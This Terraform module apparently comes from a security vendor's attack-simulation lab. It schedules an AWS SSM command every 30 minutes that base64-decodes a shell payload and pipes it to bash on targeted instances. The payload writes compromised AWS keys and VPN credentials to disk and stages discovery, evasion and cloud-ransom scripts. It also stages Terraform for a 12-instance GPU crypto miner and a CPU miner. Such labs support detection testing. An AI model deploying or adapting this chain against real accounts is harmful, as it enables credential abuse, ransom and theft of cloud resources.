locals {
    attack_dir = "/cloud-tunnel"
    aws_creds = join("\n", [ for u,k in data.template_file.aws: "echo '${k.rendered}' > ${local.attack_dir}/.env-aws-${u}" ])
    payload = <<-EOT
    LOGFILE=/tmp/attacker_exec_docker_compromised_credentials_attacker.log
    function log {
        echo `date -u +"%Y-%m-%dT%H:%M:%SZ"`" $1"
        echo `date -u +"%Y-%m-%dT%H:%M:%SZ"`" $1" >> $LOGFILE
    }
    truncate -s 0 $LOGFILE
    rm -rf ${local.attack_dir}
    mkdir -p ${local.attack_dir}
    mkdir -p ${local.attack_dir}/aws-cli/scripts
    mkdir -p ${local.attack_dir}/terraform/scripts/cloudcrypto
    mkdir -p ${local.attack_dir}/terraform/scripts/hostcrypto
    mkdir -p ${local.attack_dir}/protonvpn
    cd ${local.attack_dir}
    log "creating creds..."
    ${local.aws_creds}
    echo '${base64encode(data.template_file.start.rendered)}' | base64 -d > /${local.attack_dir}/start.sh
    echo '${base64encode(data.template_file.protonvpn.rendered)}' | base64 -d > /${local.attack_dir}/.env-protonvpn
    echo '${base64encode(data.template_file.baseline.rendered)}' | base64 -d > /${local.attack_dir}/aws-cli/scripts/baseline.sh
    echo '${base64encode(data.template_file.discovery.rendered)}' | base64 -d > /${local.attack_dir}/aws-cli/scripts/discovery.sh
    echo '${base64encode(data.template_file.evasion.rendered)}' | base64 -d > /${local.attack_dir}/aws-cli/scripts/evasion.sh
    echo '${base64encode(data.template_file.cloudransom.rendered)}' | base64 -d > /${local.attack_dir}/aws-cli/scripts/cloudransom.sh
    echo '${base64encode(data.template_file.cloudcrypto.rendered)}' | base64 -d > /${local.attack_dir}/terraform/scripts/cloudcrypto/main.tf
    echo '${base64encode(data.template_file.hostcrypto.rendered)}' | base64 -d > /${local.attack_dir}/terraform/scripts/hostcrypto/main.tf
    chmod -R 755 /${local.attack_dir}/*.sh
    log "Checking for docker..."
    while ! which docker; do
        log "docker not found - waiting"
        sleep 10
    done
    log "docker path: $(which docker)"
    log "done";
    EOT
    base64_payload = base64encode(local.payload)
}

data "template_file" "aws" {
    for_each = var.compromised_credentials
    template = file("${path.module}/resources/aws.env.tpl")

    vars = {
        aws_access_key_id = each.value.id
        aws_default_region = var.region
        aws_secret_access_key = each.value.secret
    }
}

data "template_file" "protonvpn" {
    template = file("${path.module}/resources/protonvpn.env.tpl")

    vars = {
        protonvpn_user = var.protonvpn_user
        protonvpn_password = var.protonvpn_password
        protonvpn_server = var.protonvpn_server
        protonvpn_tier = tostring(var.protonvpn_tier)
        protonvpn_protocol = var.protonvpn_protocol
    }
}

data "template_file" "baseline" {
    template = file("${path.module}/resources/baseline.sh.tpl")
}

data "template_file" "discovery" {
    template = file("${path.module}/resources/discovery.sh.tpl")
}

data "template_file" "evasion" {
    template = file("${path.module}/resources/evasion.sh.tpl")
}

data "template_file" "cloudransom" {
    template = file("${path.module}/resources/cloudransom.sh.tpl")
}

data "template_file" "cloudcrypto" {
    template = file("${path.module}/resources/cloudcrypto.tf.tpl")

    vars = {
        name = "crypto-gpu-miner"
        instances = 12
        wallet = var.wallet
        region = var.region
    }
}

data "template_file" "hostcrypto" {
    template = file("${path.module}/resources/hostcrypto.tf.tpl")

    vars = {
        name = "crypto-cpu-miner"
        region = var.region
        minergate_user = var.minergate_user
    }
}

data "template_file" "start" {
    template = file("${path.module}/resources/start.sh.tpl")
}

resource "aws_ssm_document" "exec_docker_compromised_credentials_attacker" {
  name          = "exec_docker_compromised_credentials_attacker"
  document_type = "Command"

  content = jsonencode(
    {
        "schemaVersion": "2.2",
        "description": "start docker based log4shell exploit",
        "mainSteps": [
            {
                "action": "aws:runShellScript",
                "name": "exec_docker_compromised_credentials_attacker",
                "precondition": {
                    "StringEquals": [
                        "platformType",
                        "Linux"
                    ]
                },
                "inputs": {
                    "timeoutSeconds": "1200",
                    "runCommand": [
                        "echo \"${local.base64_payload}\" > /tmp/payload_${basename(abspath(path.module))}",
                        "echo '${local.base64_payload}' | base64 -d | /bin/bash -"
                    ]
                }
            }
        ]
    })
}

resource "aws_resourcegroups_group" "exec_docker_compromised_credentials_attacker" {
    name = "exec_docker_compromised_credentials_attacker"

    resource_query {
        query = jsonencode(var.resource_query_exec_docker_compromised_credentials_attacker)
    }

    tags = {
        billing = var.environment
        owner   = "lacework"
    }
}

resource "aws_ssm_association" "exec_docker_compromised_credentials_attacker" {
    association_name = "exec_docker_compromised_credentials_attacker"

    name = aws_ssm_document.exec_docker_compromised_credentials_attacker.name

    targets {
        key = "resource-groups:Name"
        values = [
            aws_resourcegroups_group.exec_docker_compromised_credentials_attacker.name,
        ]
    }

    compliance_severity = "HIGH"

    # every 30 minutes
    schedule_expression = "cron(0/30 * * * ? *)"
    
    # will apply when updated and interval when false
    apply_only_at_cron_interval = false
}